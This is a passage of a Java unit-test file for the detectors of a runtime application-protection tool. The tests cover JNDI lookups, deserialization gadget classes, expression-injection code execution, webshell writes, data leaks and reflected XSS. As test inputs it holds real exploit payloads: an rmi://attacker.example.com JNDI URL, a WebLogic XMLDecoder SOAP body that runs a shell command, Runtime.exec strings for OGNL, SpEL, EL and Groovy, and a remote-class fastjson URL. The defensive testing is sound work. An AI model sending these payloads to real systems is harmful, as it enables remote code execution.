            "/fileserver/1.txt", "file:///etc/cron.d/root", "GET", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRenameWebshell() {
    var result = HostFileMutationDetector.detectRename("avatar.jpg", "shell.jsp", request());

    assertAlgorithm(result, "rename_webshell");
  }

  @Test
  void detectsLinkWebshell() {
    var result = HostFileMutationDetector.detectLink("avatar.jpg", "shell.jsp", "hard", request());

    assertAlgorithm(result, "link_webshell");
  }

  @Test
  void detectsJndi() {
    var result = RemoteResourceDetector.detectJndi("ldap://127.0.0.1:1389/a", request());

    assertTrue(result.isPresent());
    assertEquals("jndi_disable_all", result.orElseThrow().algorithm());
  }

  @Test
  void detectsJndiRemoteRmiScheme() {
    var result = RemoteResourceDetector.detectJndi("rmi://attacker.example.com:1099/Exploit", request());

    assertTrue(result.isPresent());
    assertEquals("jndi_disable_all", result.orElseThrow().algorithm());
  }

  @Test
  void ignoresLocalContainerJndiNames() {
    // Legitimate Java EE / container-managed lookups must not trip the detector
    // (closes the documented 100% JNDI false-positive precision gap).
    assertTrue(RemoteResourceDetector.detectJndi("java:comp/env/jdbc/AppDataSource", request()).isEmpty());
    assertTrue(RemoteResourceDetector.detectJndi("java:comp/env/jms/QueueConnectionFactory", request()).isEmpty());
    assertTrue(RemoteResourceDetector.detectJndi("java:global/AppEjb/UserService", request()).isEmpty());
    assertTrue(RemoteResourceDetector.detectJndi("jdbc/AppDataSource", request()).isEmpty());
  }

  @Test
  void declaredDirectoryDoesNotEstablishLoginModuleRouting() {
    String config = "com.sun.security.auth.module.JndiLoginModule required user.provider.url=ldap://reports.invalid/weekly;";
    assertTrue(RemoteResourceDetector.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
    var routed = RemoteResourceDetector.detectJndi("ldap://reports.invalid/weekly", request(), "JndiLoginModule.lookup");
    assertAlgorithm(routed, "jndi_jaas_config");
    assertEquals("url_scheme_selection", routed.orElseThrow().details().get("decision_basis"));
  }

  @Test
  void ignoresBenignJaasConfigWithoutJndiLoginModule() {
    String config =
        "org.apache.kafka.common.security.scram.ScramLoginModule required "
            + "username=\"app\" password=\"secret\";";

    assertTrue(RemoteResourceDetector.detectJaasConfig(config, "KafkaSasl", request()).isEmpty());
  }

  @Test
  void detectsDeserializationBlacklist() {
    var result = DeserializationDetector.detectDeserialization("io.ohmyrasp.playground.EvilSerialized", request());

    assertTrue(result.isPresent());
    assertEquals("deserialization_blacklist", result.orElseThrow().algorithm());
  }

  @Test
  void detectsExpandedDeserializationGadgetClass() {
    var result = DeserializationDetector.detectDeserialization("com.sun.rowset.JdbcRowSetImpl", request());

    assertAlgorithm(result, "deserialization_blacklist");
  }

  @Test
  void detectsBeanShellDeserializationGadgetFamily() {
    var result = DeserializationDetector.detectDeserialization("bsh.XThis", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsRomeDeserializationGadgetFamily() {
    var result =
        DeserializationDetector.detectDeserialization("com.sun.syndication.feed.impl.ToStringBean", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsC3p0DeserializationGadgetFamily() {
    var result =
        DeserializationDetector.detectDeserialization(
            "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsCommonsBeanutilsDeserializationGadgetFamily() {
    var result =
        DeserializationDetector.detectDeserialization("org.apache.commons.beanutils.BeanComparator", request());

    assertAlgorithm(result, "deserialization_gadget");
  }

  @Test
  void detectsTomcatTribesClusterMessageDeserializationGadget() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.apache.commons.collections.functors.InvokerTransformer",
            RequestContext.empty(),
            tomcatTribesStack());

	    assertAlgorithm(result, "deserialization_cluster_message");
	    assertEquals("tomcat-tribes", result.orElseThrow().details().get("transport"));
	    assertEquals(
	        "tomcat-tribes-encrypt", result.orElseThrow().details().get("securityInterceptor"));
	  }

  @Test
  void ignoresBenignTomcatTribesClusterMessageClass() {
    var result =
        DeserializationDetector.detectDeserialization("java.util.HashMap", RequestContext.empty(), tomcatTribesStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsLog4jSocketServerDeserializationGadget() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.apache.commons.collections.functors.InvokerTransformer",
            RequestContext.empty(),
            log4jSocketServerStack());

    assertAlgorithm(result, "deserialization_logging_message");
    assertEquals("log4j-socket", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignLog4jSocketServerMessageClass() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.apache.logging.log4j.core.impl.MutableLogEvent",
            RequestContext.empty(),
            log4jSocketServerStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsCasWebflowClientStateDeserializationGadget() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.apache.commons.collections4.functors.InvokerTransformer",
            RequestContext.empty(),
            casWebflowStateStack());

    assertAlgorithm(result, "deserialization_webflow_state");
    assertEquals("cas-webflow-state", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignWebflowClientStateClass() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.springframework.webflow.execution.impl.FlowExecutionImpl",
            RequestContext.empty(),
            casWebflowStateStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void fallsBackToGenericBlacklistForWebflowControllerStackWithoutClientStateDeserialization() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.apache.commons.collections4.functors.InvokerTransformer",
            RequestContext.empty(),
            List.of(
                "org.apereo.cas.web.flow.CasWebflowConfigurer",
                "org.springframework.webflow.mvc.servlet.FlowHandlerAdapter",
                "org.springframework.web.servlet.DispatcherServlet"));

    assertAlgorithm(result, "deserialization_blacklist");
  }

  @Test
  void detectsRmiTransportDeserializationGadget() {
    var result =
        DeserializationDetector.detectDeserialization("bsh.XThis", RequestContext.empty(), rmiTransportStack());

    assertAlgorithm(result, "deserialization_rmi_transport");
    assertEquals("rmi-transport", result.orElseThrow().details().get("transport"));
  }

  @Test
  void detectsNeo4jShellRmiTransportRhinoGadget() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.mozilla.javascript.NativeJavaObject",
            RequestContext.empty(),
            neo4jShellRmiStack());

    assertAlgorithm(result, "deserialization_rmi_transport");
    assertEquals("rmi-transport", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignRmiTransportDeserializationClass() {
    var result =
        DeserializationDetector.detectDeserialization(
            "org.apache.jmeter.engine.RemoteJMeterEngineImpl",
            RequestContext.empty(),
            rmiTransportStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsWeblogicT3RemotingTransportDeserializationGadget() {
    var result =
        DeserializationDetector.detectDeserialization(
            "sun.rmi.server.UnicastRef", RequestContext.empty(), weblogicT3Stack());

    assertAlgorithm(result, "deserialization_remoting_transport");
    assertEquals("weblogic-t3", result.orElseThrow().details().get("transport"));
  }

  @Test
  void detectsWeblogicIiopRemotingTransportDeserializationGadget() {
    var result =
        DeserializationDetector.detectDeserialization(
            "com.sun.rowset.JdbcRowSetImpl", RequestContext.empty(), weblogicIiopStack());

    assertAlgorithm(result, "deserialization_remoting_transport");
    assertEquals("weblogic-iiop", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignWeblogicRemotingTransportDeserializationClass() {
    var result =
        DeserializationDetector.detectDeserialization(
            "weblogic.rjvm.PeerInfo", RequestContext.empty(), weblogicT3Stack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsActiveMqJmsObjectMessageDeserializationGadget() {
    var result =
        DeserializationDetector.detectDeserialization(
            "com.rometools.rome.feed.impl.ToStringBean",
            RequestContext.empty(),
            activeMqJmsObjectMessageStack());

    assertAlgorithm(result, "deserialization_jms_object_message");
    assertEquals("activemq-object-message", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresBenignJmsObjectMessageDeserializationClass() {
    var result =
        DeserializationDetector.detectDeserialization(
            "com.example.messaging.OrderEvent",
            RequestContext.empty(),
            activeMqJmsObjectMessageStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsJenkinsCliSignedObjectDeserializationWrapper() {
    var result =
        DeserializationDetector.detectDeserialization(
            "java.security.SignedObject",
            RequestContext.empty(),
            jenkinsCliSignedObjectStack());

    assertAlgorithm(result, "deserialization_signed_object");
    assertEquals("jenkins-cli-remoting", result.orElseThrow().details().get("transport"));
  }

  @Test
  void ignoresSignedObjectDeserializationOutsideRemoteCli() {
    var result =
        DeserializationDetector.detectDeserialization(
            "java.security.SignedObject",
            RequestContext.empty(),
            List.of("com.example.security.SignedEnvelopeVerifier", "java.io.ObjectInputStream"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignJenkinsCliDeserializationClass() {
    var result =
        DeserializationDetector.detectDeserialization(
            "hudson.cli.CLICommand", RequestContext.empty(), jenkinsCliSignedObjectStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRmiRegistryProxyBindFromTransport() {
    var result =
        DeserializationDetector.detectRmiRegistryBind(
            "bind",
            "pwn",
            "jdk.proxy1.$Proxy0",
            RequestContext.empty(),
            rmiRegistryStack());

    assertAlgorithm(result, "deserialization_rmi_registry_bind");
    assertEquals("rmi-transport", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsRmiRegistryUnicastRefBindBypassShape() {
    var result =
        DeserializationDetector.detectRmiRegistryBind(
            "rebind",
            "pwn",
            "sun.rmi.server.UnicastRef",
            RequestContext.empty(),
            rmiRegistryStack());

    assertAlgorithm(result, "deserialization_rmi_registry_bind");
  }

  @Test
  void ignoresRmiRegistryProxyBindOutsideTransportDispatch() {
    var result =
        DeserializationDetector.detectRmiRegistryBind(
            "bind", "local", "jdk.proxy1.$Proxy0", RequestContext.empty(), List.of("app.Main"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresOrdinaryRmiRegistryImplementationBind() {
    var result =
        DeserializationDetector.detectRmiRegistryBind(
            "bind",
            "service",
            "com.example.ExportedService",
            RequestContext.empty(),
            rmiRegistryStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSuspiciousFileBackedSessionDeserialization() {
    var result = DeserializationDetector.detectSessionDeserialization(".deserialize", "TomcatFileStore", request());

    assertAlgorithm(result, "deserialization_session_file");
  }

  @Test
  void detectsTraversalFileBackedSessionDeserialization() {
    var result =
        DeserializationDetector.detectSessionDeserialization("../work/.payload", "TomcatFileStore", request());

    assertAlgorithm(result, "deserialization_session_file");
  }

  @Test
  void ignoresNormalRoutedTomcatSessionId() {
    var result =
        DeserializationDetector.detectSessionDeserialization(
            "A1B2C3D4E5F60718293A4B5C6D7E8F90.node1", "TomcatFileStore", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignDeserializationClass() {
    var result = DeserializationDetector.detectDeserialization("java.util.HashMap", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void apacheNativeFunctorRestrictionsRequireAnObjectStream() {
    for (String pkg : List.of("org.apache.commons.collections.functors.", "org.apache.commons.collections4.functors.")) {
      for (String type : List.of("CloneTransformer", "ForClosure", "InstantiateFactory", "WhileClosure",
          "PrototypeFactory$PrototypeCloneFactory", "PrototypeFactory$PrototypeSerializationFactory")) {
        String name = pkg + type;
        assertAlgorithm(DeserializationDetector.detectDeserialization(name, request()), "deserialization_blacklist");
        assertTrue(DeserializationDetector.detectPolymorphicType("jackson", name, request()).isEmpty(), name);
      }
    }
  }

  @Test
  void detectsFastjsonPolymorphicJndiGadget() {
    var result =
        DeserializationDetector.detectPolymorphicType(
            "fastjson",
            "com.sun.rowset.JdbcRowSetImpl",
            request(Map.of("@type", List.of("com.sun.rowset.JdbcRowSetImpl"))));

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void ignoresFastjsonClassLiteralUntilConcreteDangerousTypeIsResolved() {
    var result =
        DeserializationDetector.detectPolymorphicType(
            "fastjson", "java.lang.Class", request(Map.of("@type", List.of("java.lang.Class"))));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsJacksonPolymorphicTemplatesGadgetWithArraySyntax() {
    var result =
        DeserializationDetector.detectPolymorphicType(
            "jackson",
            "[Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;",
            request());

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void detectsJacksonPolymorphicSpringXmlContextGadget() {
    var result =
        DeserializationDetector.detectPolymorphicType(
            "jackson",
            "org.springframework.context.support.FileSystemXmlApplicationContext",
            request());

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void detectsXstreamPolymorphicJndiPrefixGadget() {
    var result =
        DeserializationDetector.detectPolymorphicType(
            "xstream", "com.sun.jndi.rmi.registry.BindingEnumeration", request());

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void detectsSnakeyamlPolymorphicH2JdbcConnection() {
    var result =
        DeserializationDetector.detectPolymorphicType(
            "snakeyaml",
            "org.h2.jdbc.JdbcConnection",
            request(Map.of("type", List.of("org.h2.jdbc.JdbcConnection"))));

    assertAlgorithm(result, "deserialization_polymorphic_type");
  }

  @Test
  void ignoresBenignPolymorphicType() {
    var result = DeserializationDetector.detectPolymorphicType("jackson", "java.util.HashMap", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsFastjson1283DirectHttpClassResource() {
    var result =
        DeserializationDetector.detectFastjsonClassResource(
            "http://192.168.65.254:19090/a.class", request());

    assertAlgorithm(result, "deserialization_fastjson_resource_url");
    assertEquals("block", result.orElseThrow().action());
    assertEquals("http", result.orElseThrow().details().get("mechanism"));
    assertEquals("ParserConfig.checkAutoType", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsFastjson1283RemoteJarAndProcFdClassResources() {
    var remote =
        DeserializationDetector.detectFastjsonClassResource(
            "jar:http://192.168.65.254:19090/probe!/foo/Exception.class", request());
    var procFd =
        DeserializationDetector.detectFastjsonClassResource(
            "jar:file:/proc/self/fd/3!/fd3/Exception.class", request());

    assertAlgorithm(remote, "deserialization_fastjson_resource_url");
    assertEquals("jar:http", remote.orElseThrow().details().get("mechanism"));
    assertAlgorithm(procFd, "deserialization_fastjson_resource_url");
    assertEquals("jar:file:proc-fd", procFd.orElseThrow().details().get("mechanism"));
  }

  @Test
  void ignoresNormalFastjsonClasspathResourcesAndUnrelatedFileUrls() {
    assertTrue(
        DeserializationDetector
            .detectFastjsonClassResource("com/example/orders/Order.class", request())
            .isEmpty());
    assertTrue(
        DeserializationDetector
            .detectFastjsonClassResource("jar:file:/opt/app/lib/models.jar!/Order.class", request())
            .isEmpty());
    assertTrue(DeserializationDetector.detectFastjsonClassResource(null, request()).isEmpty());
  }

  @Test
  void checksTheConstructorTypeSelectedForTheOpenWireException() {
    var invalid = DeserializationDetector.detectOpenWireThrowable(StringBuilder.class, RequestContext.empty());
    assertAlgorithm(invalid, "deserialization_protocol_class");
    assertEquals("non_throwable_constructor", invalid.orElseThrow().details().get("decision_basis"));
    assertTrue(DeserializationDetector.detectOpenWireThrowable(IllegalArgumentException.class, request()).isEmpty());
    assertTrue(DeserializationDetector.detectOpenWireThrowable(Error.class, request()).isEmpty());
    assertTrue(DeserializationDetector.detectOpenWireThrowable(null, request()).isEmpty());
    assertTrue(DeserializationDetector.detectProtocolClassInstantiation("OpenWire", "bsh.Report", List.of("weekly"), request()).isEmpty());
  }

  @Test
  void detectsHttpInvokerDeserializationDuringRequest() {
    var context =
        new RequestContext(
            "POST",
            "/dubbo/hello",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "content-type",
                "application/x-java-serialized-object"));

    var result = DeserializationDetector.detectHttpInvokerDeserialization("SpringHttpInvoker", context);

    assertAlgorithm(result, "deserialization_http_invoker");
    assertEquals("SpringHttpInvoker", result.orElseThrow().details().get("mechanism"));
    assertTrue(result.orElseThrow().requiresExplicitRule());
    assertEquals("invocation_stream_read", result.orElseThrow().details().get("decision_basis"));
  }

  @Test
  void ignoresHttpInvokerDeserializationOutsideRequest() {
    var result =
        DeserializationDetector.detectHttpInvokerDeserialization("SpringHttpInvoker", RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void checksObservedServletObjectReadForExplicitPolicy() {
    var result =
        DeserializationDetector.detectHttpObjectStreamDeserialization(
            "report.RequestBody", request());

    assertAlgorithm(result, "deserialization_http_object_stream");
    assertTrue(result.orElseThrow().requiresExplicitRule());
    assertEquals("servlet_stream_read", result.orElseThrow().details().get("decision_basis"));
  }

  @Test
  void serializedContentTypeAloneDoesNotIdentifyTheStream() {
    var context =
        new RequestContext(
            "POST",
            "/invoker/readonly",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/x-java-serialized-object"));

    var result =
        DeserializationDetector.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream", context, List.of());

    assertTrue(result.isEmpty());
  }

  @Test
  void readOnlyAccessFilterStackAloneDoesNotIdentifyTheStream() {
    var result =
        DeserializationDetector.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream",
            request(),
            List.of("org.jboss.invocation.http.servlet.ReadOnlyAccessFilter"));

    assertTrue(result.isEmpty());
  }

  @Test
  void invokerServletStackAloneDoesNotIdentifyTheStream() {
    var result =
        DeserializationDetector.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream",
            request(),
            List.of("org.jboss.invocation.http.servlet.InvokerServlet"));

    assertTrue(result.isEmpty());
  }

  @Test
  void httpilStackAloneDoesNotIdentifyTheStream() {
    var result =
        DeserializationDetector.detectHttpObjectStreamDeserialization(
            "java.io.BufferedInputStream",
            request(),
            List.of("org.jboss.mq.il.http.HTTPServerILServlet"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresFileObjectStreamDuringHttpRequest() {
    var result =
        DeserializationDetector.detectHttpObjectStreamDeserialization(
            "java.io.FileInputStream", request(), List.of("com.example.ReportController"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresRequestObjectStreamOutsideHttpRequest() {
    var result =
        DeserializationDetector.detectHttpObjectStreamDeserialization(
            "org.apache.catalina.connector.CoyoteInputStream", RequestContext.empty(), List.of());

    assertTrue(result.isEmpty());
  }

  @Test
  void checksTheSelectedHessianAllocation() {
    assertTrue(DeserializationDetector.detectHessianType("java.lang.ProcessBuilder", request()).isEmpty());
    assertTrue(DeserializationDetector.detectHessianAllocation(java.util.HashMap.class, "hessian_constructor", request()).isEmpty());
    assertTrue(DeserializationDetector.detectHessianAllocation(ProcessBuilder[].class, "hessian_constructor", request()).isEmpty());
    var result = DeserializationDetector.detectHessianAllocation(ProcessBuilder.class, "hessian_constructor", RequestContext.empty());
    assertAlgorithm(result, "deserialization_hessian_type");
    assertEquals("hessian_constructor", result.orElseThrow().details().get("decision_basis"));
  }

  @Test
  void detectsXmlRpcSerializableValueDuringRequest() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/xmlrpc",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/xml"));

    var result = DeserializationDetector.detectXmlRpcSerializableValue("ApacheXmlRpc", context);

    assertAlgorithm(result, "deserialization_xmlrpc_serialized");
    assertEquals("ApacheXmlRpc", result.orElseThrow().details().get("mechanism"));
    assertEquals("xmlrpc_extension_read", result.orElseThrow().details().get("decision_basis"));
    assertTrue(result.orElseThrow().requiresExplicitRule());
    assertTrue(DeserializationDetector.detectXmlRpcSerializableValue("declaration", context).isEmpty());
  }

  @Test
  void xmlRpcWorkerReadRequiresExplicitTransportPolicy() {
    var result =
        DeserializationDetector.detectXmlRpcSerializableValue("ApacheXmlRpc", RequestContext.empty());

    assertTrue(result.orElseThrow().requiresExplicitRule());
  }

  @Test
  void detectsXmlDecoderProcessBuilderStart() {
    var result =
        DeserializationDetector.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder",
            "start",
            List.of("sh", "-c", "id"),
            request(),
            xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_runtime");
  }

  @Test
  void detectsWebLogicWorkContextXmlDecoderProcessBuilderStart() {
    String body =
        """
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0"><string>sh</string></void>
                    <void index="1"><string>-c</string></void>
                    <void index="2"><string>id</string></void>
                  </array>
                  <void method="start"/>
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        """;
    RequestContext context =
        new RequestContext(
            "POST",
            "/wls-wsat/CoordinatorPortType",
            "",
            Map.of(),
            Map.of("content-type", "text/xml"),
            body);

    var result =
        DeserializationDetector.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder",
            "start",
            List.of("sh", "-c", "id"),
            context,
            xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_runtime");
    assertEquals("/wls-wsat/CoordinatorPortType", result.orElseThrow().request().uri());
    assertEquals("java.lang.ProcessBuilder", result.orElseThrow().details().get("target"));
  }

  @Test
  void detectsXmlDecoderRuntimeExec() {
    var result =
        DeserializationDetector.detectXmlDecoderExpression(
            "java.lang.Runtime", "exec", List.of("id"), request(), xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_runtime");
  }

  @Test
  void detectsXmlDecoderServerSideScriptWriter() {
    var result =
        DeserializationDetector.detectXmlDecoderExpression(
            "java.io.PrintWriter", "new", List.of("/tmp/shell.jsp"), request(), xmlDecoderStack());

    assertAlgorithm(result, "xml_decoder_webshell");
  }

  @Test
  void ignoresJavaBeansRuntimeOutsideXmlDecoderStack() {
    var result =
        DeserializationDetector.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder", "start", List.of("id"), request(), List.of("app.BeanUtil"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundXmlDecoderRuntime() {
    var result =
        DeserializationDetector.detectXmlDecoderExpression(
            "java.lang.ProcessBuilder",
            "start",
            List.of("id"),
            RequestContext.empty(),
            xmlDecoderStack());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsOgnlBlacklist() {
    var result = CodeExecutionDetector.detectOgnl("@java.lang.Runtime@getRuntime().exec('id')", request());

    assertAlgorithm(result, "ognl_blacklist");
  }

  @Test
  void detectsOgnlLengthLimit() {
    var result = CodeExecutionDetector.detectOgnl("a".repeat(401), request());

    assertAlgorithm(result, "ognl_length_limit");
  }

  @Test
  void detectsSpringExpressionRuntimeExecution() {
    var expression = "T(java.lang.Runtime).getRuntime().exec('id')";
    var result =
        CodeExecutionDetector.detectExpression(
            "spel",
            expression,
            request(Map.of("spring.cloud.function.routing-expression", List.of(expression))));

    assertAlgorithm(result, "spel_runtime");
  }

  @Test
  void detectsTemplateRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "template",
            "#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))",
            request());

    assertAlgorithm(result, "template_runtime");
  }

  @Test
  void detectsJexlRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "jexl",
            "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')",
            request());

    assertAlgorithm(result, "jexl_runtime");
  }

  @Test
  void detectsElReflectiveRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "el",
            "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('id')}",
            request());

    assertAlgorithm(result, "el_runtime");
  }

  @Test
  void detectsJavascriptRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "javascript",
            "function(){ java.lang.Runtime.getRuntime().exec('id'); }",
            request());

    assertAlgorithm(result, "javascript_runtime");
  }

  @Test
  void detectsJiffleRuntimeExecutionWithoutLoggingRawScript() {
    String expression =
        "dest = y() - 500; // */ public class Double { static { "
            + "java.lang.Runtime.getRuntime().exec(\"id\"); } } /**";
    var result =
        CodeExecutionDetector.detectExpression("jiffle", expression, request(Map.of("script", List.of(expression))));

    assertAlgorithm(result, "jiffle_runtime");
    assertEquals("jiffle", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertTrue(!result.orElseThrow().details().containsKey("expression"));
  }

  @Test
  void detectsGeoServerCve202224816WpsJiffleRuntimeExecutionFromXmlBody() {
    String expression =
        "dest = y() - 500; // */ public class Double { static { "
            + "java.lang.Runtime.getRuntime().exec(\"id\"); } } /**";
    String body =
        """
        <wps:Execute service="WPS" version="1.0.0"
            xmlns:wps="http://www.opengis.net/wps/1.0.0"
            xmlns:ows="http://www.opengis.net/ows/1.1">
          <wps:DataInputs>
            <wps:Input>
              <ows:Identifier>script</ows:Identifier>
              <wps:Data><wps:LiteralData>%s</wps:LiteralData></wps:Data>
            </wps:Input>
          </wps:DataInputs>
        </wps:Execute>
        """
            .formatted(expression);
    RequestContext context =
        new RequestContext(
            "POST",
            "/geoserver/wms",
            "",
            Map.of(),
            Map.of("content-type", "application/xml"),
            body);

    var result = CodeExecutionDetector.detectExpression("jiffle", expression, context);

    assertAlgorithm(result, "jiffle_runtime");
    assertEquals("/geoserver/wms", result.orElseThrow().request().uri());
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
    assertEquals(String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertTrue(!result.orElseThrow().details().containsKey("expression"));
  }

  @Test
  void detectsMvelRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "mvel",
            "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream())",
            request());

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsGroovyStringCommandExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "groovy",
            "def command='id';def res=command.execute().text;res",
            request());

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsXpathRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "xpath", "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')", request());

    assertAlgorithm(result, "xpath_runtime");
  }

  @Test
  void detectsXpathProcessBuilderExecution() {
    var result =
        CodeExecutionDetector.detectExpression(
            "xpath", "new java.lang.ProcessBuilder('id').start()", request());

    assertAlgorithm(result, "xpath_runtime");
  }

  @Test
  void ignoresHarmlessXpathExpression() {
    var result = CodeExecutionDetector.detectExpression("xpath", "/root/name/text()", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessJexlExpression() {
    var result = CodeExecutionDetector.detectExpression("jexl", "user.name ?: 'guest'", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessElExpression() {
    var result = CodeExecutionDetector.detectExpression("el", "${user.name}", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessJiffleExpression() {
    var result = CodeExecutionDetector.detectExpression("jiffle", "dest = x() + y();", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRequestTimeJavaCompilationRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectJavaCompilation(
            "javac",
            """
            public class Demo {
              static void run() throws Exception {
                java.lang.Runtime.getRuntime().exec("id");
              }
            }
            """,
            request());

    assertAlgorithm(result, "java_compile_runtime");
  }

  @Test
  void detectsJavaCompilationProcessBuilderExecution() {
    var result =
        CodeExecutionDetector.detectJavaCompilation(
            "janino",
            "class Demo { void run() throws Exception { new ProcessBuilder(\"id\").start(); } }",
            request());

    assertAlgorithm(result, "java_compile_runtime");
  }

  @Test
  void ignoresHarmlessJavaCompilation() {
    var result =
        CodeExecutionDetector.detectJavaCompilation(
            "javac", "public class Demo { int add(int a, int b) { return a + b; } }", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundJavaCompilationRuntimeExecution() {
    var result =
        CodeExecutionDetector.detectJavaCompilation(
            "javac",
            "public class Demo { void run() throws Exception { Runtime.getRuntime().exec(\"id\"); } }",
            RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessSpringExpression() {
    var result = CodeExecutionDetector.detectExpression("spel", "T(java.lang.Math).abs(-1)", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessGroovyScript() {
    var result = CodeExecutionDetector.detectExpression("groovy", "def total = 1 + 2; total", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsEvalRegex() {
    var result = CodeExecutionDetector.detectEval("eval", "return base64_decode($x);", request());

    assertAlgorithm(result, "eval_regex");
  }

  @Test
  void detectsLoadLibraryUnc() {
    var result = CodeExecutionDetector.detectLoadLibrary("System.load", "\\\\server\\share\\evil.dll", true, request());

    assertAlgorithm(result, "loadLibrary_unc");
  }

  @Test
  void detectsResponseIdentityCardLeak() {
    var result = ResponseContentDetector.detectResponseDataLeak("application/json", "{\"id\":\"11010519491231002X\"}", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsResponseMobileLeak() {
    var result = ResponseContentDetector.detectResponseDataLeak("text/html", "phone=13800138000", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsResponseBankCardLeak() {
    var result = ResponseContentDetector.detectResponseDataLeak("application/xml", "<card>4111 1111 1111 1111</card>", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsXssEcho() {
    var result =
        ResponseContentDetector.detectXssEcho(
            "hello <script>alert(1)</script>",
            request(Map.of("q", List.of("<script>alert(1)</script>"))));

    assertAlgorithm(result, "xss_echo");
  }

  @Test
  void ignoresApplicationScriptWithoutMatchingRequestParameter() {
